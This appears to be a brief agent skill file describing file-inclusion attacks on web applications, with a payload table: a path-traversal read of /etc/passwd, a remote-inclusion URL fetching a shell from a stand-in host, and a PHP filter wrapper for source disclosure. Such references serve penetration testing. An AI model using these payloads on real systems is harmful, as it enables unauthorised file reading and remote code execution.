---
name: file-attacks
description: Skills for file-based web attacks including local and remote file inclusion. Use when this capability is needed.
metadata:
  author: omkar-ukirde
---

# File-Based Attacks

Exploiting file handling vulnerabilities in web applications.

## Skills

- [File Inclusion](references/file-inclusion.md) - LFI/RFI exploitation

## Quick Reference

| Type | Payload | Impact |
|------|---------|--------|
| LFI | `../../../etc/passwd` | File read |
| RFI | `http://evil.com/shell.php` | RCE |
| PHP Wrapper | `php://filter/convert.base64-encode` | Source disclosure |

---
> Converted and distributed by [TomeVault](https://tomevault.io/claim/omkar-ukirde) — claim your Tome and manage your conversions.
<!-- tomevault:4.0:skill_md:2026-04-14 -->
